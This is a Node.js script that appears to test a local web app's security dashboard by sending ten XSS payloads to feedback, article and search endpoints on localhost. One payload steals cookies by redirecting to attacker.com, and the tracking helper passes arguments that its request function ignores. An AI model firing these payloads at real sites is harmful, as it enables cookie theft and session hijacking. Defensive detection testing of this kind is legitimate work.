import http from "http";

const TARGET_HOST = 'localhost';
const TARGET_PORT = 3000;

const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(\"XSS\")">',
  '<script>document.location="http://attacker.com?cookie="+document.cookie</script>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<link rel="import" href="javascript:alert(\"XSS\")">'
];

async function makeRequest(path, headers = {}) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: TARGET_HOST,
      port: TARGET_PORT,
      path: path,
      method: 'GET',
      headers: {
        'X-Test-Attack': 'xss',
        ...headers
      }
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });

    req.on('error', (err) => {
      reject(new Error(err.code || 'Connection failed'));
    });
    
    req.end();
  });
}

async function trackAttack(attackType, payload, ip = null) {
  try {
    await makeRequest('/api/security/track', 'POST', {
      attackType,
      payload,
      ipAddress: ip || `192.168.1.${Math.floor(Math.random() * 255)}`,
      userAgent: 'TestBot/1.0',
      endpoint: '/api/feedback'
    }, { 'Content-Type': 'application/json' });
  } catch (e) {
    console.log(`  Track error: ${e.message}`);
  }
}

async function simulateXSS() {
  console.log('\n🟡 Testing XSS (Cross-Site Scripting) Attack Simulation...\n');
  console.log('Sending various XSS payloads...\n');

  const results = [];
  
  for (let i = 0; i < xssPayloads.length; i++) {
    const payload = xssPayloads[i];
    const ip = `192.168.2.${i + 1}`;
    const testPaths = [
      `/api/feedback?comment=${encodeURIComponent(payload)}`,
      `/api/articles?title=${encodeURIComponent(payload)}`,
      `/api/search?q=${encodeURIComponent(payload)}`
    ];

    for (const path of testPaths) {
      try {
        const result = await makeRequest(path, {
          'X-Attack-Payload': payload
        });
        results.push({ payload, path, status: result.status });
        console.log(`  Payload: "${payload.substring(0, 25)}..." on ${path} → Status ${result.status}`);
      } catch (e) {
        console.log(`  Error: ${e.message}`);
      }
      
      await new Promise(r => setTimeout(r, 50));
    }
    
    if (i % 3 === 0) {
      await trackAttack('xss', payload, ip);
    }
  }

  await trackAttack('xss', '30 XSS payloads tested', '192.168.2.255');
  
  console.log('\n✅ XSS Attack Test Complete');
  console.log('   Check Security Dashboard > Threat Analysis');
  console.log('   XSS attacks should be detected and logged\n');
  
  return results;
}

simulateXSS().catch(console.error);